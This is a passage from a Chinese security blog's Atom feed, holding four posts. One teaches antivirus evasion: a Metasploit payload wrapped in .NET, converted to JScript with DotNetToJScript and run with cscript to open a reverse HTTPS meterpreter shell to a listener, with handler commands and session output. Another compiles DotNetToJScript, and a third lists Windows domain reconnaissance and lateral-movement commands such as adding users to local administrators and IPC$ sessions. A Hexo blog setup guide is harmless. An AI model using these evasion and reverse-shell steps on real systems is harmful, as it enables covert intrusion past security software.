here”的下面。</p><p>保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”并保存，如图：</p><p><img src="/uploads/22.png" alt="vs2017"></p><p>增加 Release 版的 x86 编译对象，如图：</p><p><img src="/uploads/33.png" alt="release"></p><p>然后生成出 MSFWrapper.exe ：</p><p><img src="/uploads/44.png" alt="生成exe"></p><h2 id="0x02-将生成的-exe-文件转换成-js-文件"><a href="#0x02-将生成的-exe-文件转换成-js-文件" class="headerlink" title="0x02 将生成的 exe 文件转换成 js 文件"></a>0x02 将生成的 exe 文件转换成 js 文件</h2><p><a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">DotNetToJScript源码下载 </a></p><p><a href="http://s.yl0.org/2017/12/17/开源工具%20DotNetToJScript.html" target="_blank" rel="noopener">开源工具DotNetToJScript详细编译教程</a></p><p>转换命令：</p><p><code>F:\WEB渗透工具&gt;DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program MSFWrapper.exe</code></p><h2 id="0x03-通过命令执行-js-文件使其弹回-Meterpreter-shell"><a href="#0x03-通过命令执行-js-文件使其弹回-Meterpreter-shell" class="headerlink" title="0x03 通过命令执行 js 文件使其弹回 Meterpreter shell"></a>0x03 通过命令执行 js 文件使其弹回 Meterpreter shell</h2><p>在 kali 里执行命令进行监听：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="meta"># msfconsole </span></span><br><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 192.168.1.99</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 443</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p>在目标机器执行如下命令：</p><p><code>C:\windows\SysWOW64\cscript.exe /e:JScript MSFWrapper.js</code></p><p>kali 反弹回 meterpreter ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Started HTTPS reverse handler on https://192.168.1.99:443</span><br><span class="line">[*] https://192.168.1.99:443 handling request from 192.168.1.84; (UUID: flnzcixx) Staging x86 payload (180825 bytes) ...</span><br></pre></td></tr></table></figure><p>这里一定要注意，因为我们生成的 Payload 跟 exe 都是 32 位的，所以这里也要用 32 的 cscript.exe 去执行。切记！</p><h2 id="0x04-END"><a href="#0x04-END" class="headerlink" title="0x04 END"></a>0x04 END</h2><p>未完待续 ing……</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;MSF 是当下最流行的渗透测试平台，在进行后渗透阶段往往需要我们绕过杀软等隐蔽操作，在看完余弦猥琐流打发之后，自个手动实践，然后写一个详细的演练操作，做笔记存档。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="免杀" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="https://yaalonsong.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="payloads" scheme="https://yaalonsong.github.io/tags/payloads/"/>
    
  </entry>
  
  <entry>
    <title>开源工具DotNetToJScript详细编译教程</title>
    <link href="https://yaalonsong.github.io/2017/12/18/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7%20DotNetToJScript.html"/>
    <id>https://yaalonsong.github.io/2017/12/18/开源工具 DotNetToJScript.html</id>
    <published>2017-12-17T16:05:34.000Z</published>
    <updated>2018-08-22T17:19:09.619Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>James Forshaw开源了一个工具DotNetToJScript，能够利用JS/Vbs脚本加载.Net程序，这是一款可以将 .net 程序转换为 jscript 代码的工具。</p><p>工具下载：<a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">下载地址</a></p><a id="more"></a><h2 id="0x01-用到工具"><a href="#0x01-用到工具" class="headerlink" title="0x01 用到工具"></a>0x01 用到工具</h2><p>由于此为开源代码需要自己编译，通过自己的研究终于编译成功。</p><ul><li>使用工具vs2017； </li><li>ndesk-options-0.2.1.bin 文件的引用。</li></ul><h2 id="0x02-编译过程"><a href="#0x02-编译过程" class="headerlink" title="0x02 编译过程"></a>0x02 编译过程</h2><ul><li><p>打开vs2017，点击打开项目/解决方案；<img src="/uploads/3.png" alt="3"></p></li><li><p>打开DotNetToJScript目录下的DotNetToJScript.csproj Visual C#  项目文件；<img src="/uploads/4.png" alt="4"></p></li><li><p>点击Program.cs生成解决方案；</p><p><img src="/uploads/5.png" alt="5"></p></li><li><p>报错缺少程序集引用 NDesk.Options；<img src="/uploads/2.png" alt="2"></p></li><li><p>解决办法</p><p>需要添加引用 NDesk.Options</p><p>下载地址：</p><p><a href="http://www.ndesk.org/archive/ndesk-options/ndesk-options-0.2.1.bin.zip" target="_blank" rel="noopener">点击下载</a>           解压缩，按图添加引用；</p><p><img src="/uploads/1.png" alt="1"></p><p>​</p></li><li><p>浏览—-选择图中文件—-添加；</p><p><img src="/uploads/7.png" alt="7"></p></li><li><p>然后重新生成解决方案即可；<img src="/uploads/8.png" alt="8"></p><p>​</p><p>​</p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h2&gt;&lt;p&gt;James Forshaw开源了一个工具DotNetToJScript，能够利用JS/Vbs脚本加载.Net程序，这是一款可以将 .net 程序转换为 jscript 代码的工具。&lt;/p&gt;
&lt;p&gt;工具下载：&lt;a href=&quot;https://github.com/tyranid/DotNetToJScript&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;下载地址&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="免杀" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="Tools" scheme="https://yaalonsong.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Hexo + Next 搭建GitHub page</title>
    <link href="https://yaalonsong.github.io/2017/12/13/Hexo+next.html"/>
    <id>https://yaalonsong.github.io/2017/12/13/Hexo+next.html</id>
    <published>2017-12-13T10:37:02.000Z</published>
    <updated>2018-08-22T17:31:40.935Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00 准备工作"></a>0x00 准备工作</h2><ul><li>下载node.js并安装 <a href="https://nodejs.org" title="点击下载安装" target="_blank" rel="noopener">官网下载安装</a>默认会安装npm；</li><li>下载安装git <a href="https://git-scm.com/downloads" title="点击下载安装" target="_blank" rel="noopener">官网下载安装</a>；</li><li>安装hexo，方法：管理员打开cmd：<br><code>$ npm install -g hexo-cli</code>。</li></ul><a id="more"></a><h2 id="0x01-本地生成hexo文件"><a href="#0x01-本地生成hexo文件" class="headerlink" title="0x01 本地生成hexo文件"></a>0x01 本地生成hexo文件</h2><ul><li>在本地新建一个文件夹 e.g. D:/Hexo ；</li><li>在D:/Hexo目录下鼠标右键”Git Bash Here”，输入：<code>hexo init</code>;</li><li>输入：<code>hexo g</code> 生成静态网页，<code>hexo s</code> 启动本地服务预览；</li><li><p>完成后Hexo文件夹会生成以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure></li><li><p>打开本地浏览器 输入：<code>http://localhost:4000</code> 进行访问。</p></li></ul><h2 id="0x02-将本地hexo推送到GitHub"><a href="#0x02-将本地hexo推送到GitHub" class="headerlink" title="0x02 将本地hexo推送到GitHub"></a>0x02 将本地hexo推送到GitHub</h2><ul><li>在GitHub上创建名字为 zhangsan.github.io 的项目zhangsan是自己的github用户名；</li><li><p>打开 <code>D:/Hexo/_config.yml</code> 配置文件，修改以下内容为 <code>http://zhangsan.github.io</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;</span><br><span class="line">url: http://zhangsan.github.io</span><br></pre></td></tr></table></figure></li><li><p>打开 <code>D:/Hexo/_config</code>配置文件，在文末的deploy做以下设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://github.com/zhangsan/zhangsan.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure></li><li><p>执行：<code>npm install hexo-deployer-git –save</code>  （此命令最好在管理员权限的cmd下执行）；</p></li><li>执行：hexo clear (一般情况下不用执行这个命令，当网站错误打不开的时候再执行它！)；</li><li>执行：hexo g （本地生成静态文件）；</li><li>执行：hexo d （将本地静态文件推送至Github)；</li><li>期间会弹出github登录框按提示登录即可，登录成功一次往后不用重复登录；</li><li>通过<code>http://zhangsan.github.io</code>即可访问。</li></ul><h2 id="0x03-绑定自己的域名"><a href="#0x03-绑定自己的域名" class="headerlink" title="0x03 绑定自己的域名"></a>0x03 绑定自己的域名</h2><ul><li>域名服务商-控制面板-DNS解析—添加CNAME记录：<br><code>@ &gt;&gt;&gt; zhangsan.github.io</code><br><center>OR</center><br><code>www &gt;&gt;&gt; zhangsan.github.io</code></li><li>在<code>Hexo/sorce</code>新建CNAME文件写入域名，CNAME文件，注意没有文件后缀；</li><li>执行：hexo g</li><li>执行：hexo s（本地预览，可以跳过）</li><li>执行：hexo d</li></ul><h2 id="0x04-使用next主题并给网站添加浏览器logo"><a href="#0x04-使用next主题并给网站添加浏览器logo" class="headerlink" title="0x04 使用next主题并给网站添加浏览器logo"></a>0x04 使用next主题并给网站添加浏览器logo</h2><ul><li>主题下载，<a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">next在github下载</a>，并把next文件夹放到temes文件夹；</li><li>使用next主题，编辑<code>Hexo/_config.yml</code>以下内容：<br><code>##Themes: https://hexo.io/themes/</code><br><code>theme: next</code></li><li><p>将尺寸为32x32 favicon.ico 文件放在<code>hexo/source/</code>文件夹内，然后修改<code>Hexo\themes\next\_config.yml</code>为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Put your favicon.ico into `hexo-site/source/` directory.</span><br><span class="line">favicon: /favicon.ico</span><br></pre></td></tr></table></figure></li><li><p>编辑<code>Hexo/_config.yml</code>以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Place your favicon.ico to /source directory.</span><br><span class="line">favicon: /favicon.ico</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x05-将网站显示为中文"><a href="#0x05-将网站显示为中文" class="headerlink" title="0x05 将网站显示为中文"></a>0x05 将网站显示为中文</h2><ul><li><p>编辑<code>D:/Hexo/_config.yml</code>配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">language: zh-Hans  #将默认改成zh-Hans</span><br><span class="line">timezone:</span><br></pre></td></tr></table></figure></li><li><p>在<code>Hexo/next/lanhuages</code>目录下的zh-Hans.yml文件可以自行修改，增加和删除。</p></li></ul><h2 id="0x06-添加菜单和自定义菜单前的图标"><a href="#0x06-添加菜单和自定义菜单前的图标" class="headerlink" title="0x06 添加菜单和自定义菜单前的图标"></a>0x06 添加菜单和自定义菜单前的图标</h2><ul><li><p>编辑<code>themes\next\_config.yml</code>，到menu:字段，在该字段下添加一个字段；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: /</span><br><span class="line">  about: /about</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure></li><li><p>自定义小图标，关于next使用的小图标你可以通过这个网站<a href="http://fontawesome.io/icons/" target="_blank" rel="noopener">Font Awesome</a>来查看自己喜欢的图标，然后copy图标名，编辑<code>Hexo\themes\next\_config.yml</code>，将对应的图标名换成自己喜欢的小图标；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">menu_icons:</span><br><span class="line">  enable: true</span><br><span class="line">  #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome</span><br><span class="line">  home: home</span><br><span class="line">  about: mortar-board</span><br><span class="line">  categories: smile-o</span><br><span class="line">  schedule: calendar</span><br><span class="line">  tags: diamond</span><br><span class="line">  archives: angellist</span><br><span class="line">  sitemap: sitemap</span><br><span class="line">  commonweal: heartbeat</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x07-隐藏网页底部powered-By-Hexo-强力驱动"><a href="#0x07-隐藏网页底部powered-By-Hexo-强力驱动" class="headerlink" title="0x07 隐藏网页底部powered By Hexo / 强力驱动"></a>0x07 隐藏网页底部powered By Hexo / 强力驱动</h2><p> 打开themes/next/layout/_partials/footer.swig,使用””隐藏之间的代码即可，或者直接删除。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">&lt;div class=&quot;powered-by&quot;&gt;</span><br><span class="line">  &#123;&#123; __(&apos;footer.powered&apos;, &apos;&lt;a class=&quot;theme-link&quot; rel=&quot;external nofollow&quot; href=&quot;https://hexo.io&quot;&gt;Hexo&lt;/a&gt;&apos;) &#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;theme-info&quot;&gt;</span><br><span class="line">  &#123;&#123; __(&apos;footer.theme&apos;) &#125;&#125; -</span><br><span class="line">  &lt;a class=&quot;theme-link&quot; rel=&quot;external nofollow&quot; href=&quot;https://github.com/iissnan/hexo-theme-next&quot;&gt;</span><br><span class="line">    NexT.&#123;&#123; theme.scheme &#125;&#125;</span><br><span class="line">  &lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><h2 id="0x08-增加本地搜索功能"><a href="#0x08-增加本地搜索功能" class="headerlink" title="0x08 增加本地搜索功能"></a>0x08 增加本地搜索功能</h2><p>安装 hexo-generator-searchdb，在站点的根目录下执行以下命令：<br><code>$ npm install hexo-generator-searchdb --save</code><br>如果报错多执行几次，有的时候是网络原因，最好在管理员权限下的cmd里执行npm安装命令。<br>编辑<code>Hexo/_config.yml</code>，新增以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure></p><h2 id="0x09-使用来必力评论功能"><a href="#0x09-使用来必力评论功能" class="headerlink" title="0x09 使用来必力评论功能"></a>0x09 使用来必力评论功能</h2><ul><li>到<a href="https://livere.com/" target="_blank" rel="noopener">livere</a>注册账号，安装来必力，记录以下内容：<center><img src="/uploads/livere2.png" alt="记录uid"></center></li><li>在<code>next/_config.yml</code>的此处加上自己的livere的uid：<br><code>livere_uid: your uid</code></li><li>然后去博客查看吧文章下面会看到以下景象：<center><img src="/uploads/livere1.png" alt="livere设置完成"></center></li></ul><h2 id="0x10-参考文章"><a href="#0x10-参考文章" class="headerlink" title="0x10 参考文章"></a>0x10 参考文章</h2><p>(<a href="https://thief.one/2017/03/03/Hexo搭建博客教程/" target="_blank" rel="noopener">https://thief.one/2017/03/03/Hexo搭建博客教程/</a>)</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-准备工作&quot;&gt;&lt;a href=&quot;#0x00-准备工作&quot; class=&quot;headerlink&quot; title=&quot;0x00 准备工作&quot;&gt;&lt;/a&gt;0x00 准备工作&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;下载node.js并安装 &lt;a href=&quot;https://nodejs.org&quot; title=&quot;点击下载安装&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官网下载安装&lt;/a&gt;默认会安装npm；&lt;/li&gt;
&lt;li&gt;下载安装git &lt;a href=&quot;https://git-scm.com/downloads&quot; title=&quot;点击下载安装&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官网下载安装&lt;/a&gt;；&lt;/li&gt;
&lt;li&gt;安装hexo，方法：管理员打开cmd：&lt;br&gt;&lt;code&gt;$ npm install -g hexo-cli&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Hexo" scheme="https://yaalonsong.github.io/categories/Hexo/"/>
    
    
      <category term="Hexo" scheme="https://yaalonsong.github.io/tags/Hexo/"/>
    
      <category term="github" scheme="https://yaalonsong.github.io/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>Windows 内网命令收集</title>
    <link href="https://yaalonsong.github.io/2017/12/09/Windows%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4.html"/>
    <id>https://yaalonsong.github.io/2017/12/09/Windows内网命令.html</id>
    <published>2017-12-08T19:53:30.000Z</published>
    <updated>2018-08-22T17:18:52.498Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows-内网命令"><a href="#Windows-内网命令" class="headerlink" title="Windows 内网命令"></a>Windows 内网命令</h1><h2 id="常见信息收集命令"><a href="#常见信息收集命令" class="headerlink" title="常见信息收集命令"></a>常见信息收集命令</h2><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">net user                                               本机用户列表    </span><br><span class="line">net localgroup administrators                          本机管理员[通常含有域用户]    </span><br><span class="line">net user /domain                                       查询域用户    </span><br><span class="line">net group /domain                                      查询域里面的工作组    </span><br><span class="line">net group &quot;domain admins&quot; /domain                      查询域管理员用户组    </span><br><span class="line">net localgroup administrators /domain                  登录本机的域管理员    </span><br><span class="line">net localgroup administrators workgroup\user001 /add   域用户添加到本机    </span><br><span class="line">net group &quot;Domain controllers&quot;                         查看域控制器(如果有多台)    </span><br><span class="line">ipconfig /all                                          查询本机IP段，所在域等    </span><br><span class="line">net view                                               查询同一域内机器列表    </span><br><span class="line">net view /domain                                       查询域列表    </span><br><span class="line">net view /domain:domainname                            查看workgroup域中计算机列表</span><br></pre></td></tr></table></figure><h2 id="内网-域-渗透–基本命令"><a href="#内网-域-渗透–基本命令" class="headerlink" title="内网(域)渗透–基本命令"></a>内网(域)渗透–基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all                                          查询本机IP段，所在域等 </span><br><span class="line">net user                                               本机用户列表 </span><br><span class="line">net localgroup administrators                          本机管理员[通常含有域用户] </span><br><span class="line">net user /domain                                       查询域用户 </span><br><span class="line">net group /domain                                      查询域里面的工作组 </span><br><span class="line">net group &quot;domain admins&quot; /domain                      查询域管理员用户组 </span><br><span class="line">net localgroup administrators /domain                  登录本机的域管理员 </span><br><span class="line">net localgroup administrators workgroup\user001 /add   域用户添加到本机 </span><br><span class="line">net group &quot;domain controllers&quot; /domain                 查看域控制器(如果有多台) </span><br><span class="line">net time /domain                                       判断主域，主域服务器都做时间服务器 </span><br><span class="line">net config workstation                                 当前登录域 </span><br><span class="line">net session                                            查看当前会话 </span><br><span class="line">net use \\ip\ipc$ pawword /user:username               建立IPC会话[空连接­***] </span><br><span class="line">net share                                              查看SMB指向的路径[即共享] </span><br><span class="line">net view                                               查询同一域内机器列表 </span><br><span class="line">net view \\ip                                          查询某IP共享 </span><br><span class="line">net view /domain                                       查询域列表 </span><br><span class="line">net view /domain:domainname                            查看workgroup域中计算机列表 </span><br><span class="line">net start                                              查看当前运行的服务 </span><br><span class="line">net accounts                                           查看本地密码策略 </span><br><span class="line">net accounts /domain                                   查看域密码策略</span><br><span class="line">nbtstat –A ip                                          netbios 查询  </span><br><span class="line">netstat –an/ano/anb                                    网络连接查询  </span><br><span class="line">route print                                            路由表</span><br></pre></td></tr></table></figure><hr><p><center>End</center></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Windows-内网命令&quot;&gt;&lt;a href=&quot;#Windows-内网命令&quot; class=&quot;headerlink&quot; title=&quot;Windows 内网命令&quot;&gt;&lt;/a&gt;Windows 内网命令&lt;/h1&gt;&lt;h2 id=&quot;常见信息收集命令&quot;&gt;&lt;a href=&quot;#常见信息收集命令&quot; class=&quot;headerlink&quot; title=&quot;常见信息收集命令&quot;&gt;&lt;/a&gt;常见信息收集命令&lt;/h2&gt;
    
    </summary>
    
      <category term="内网" scheme="https://yaalonsong.github.io/categories/intranet/"/>
    
    
      <category term="内网" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="域渗透" scheme="https://yaalonsong.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
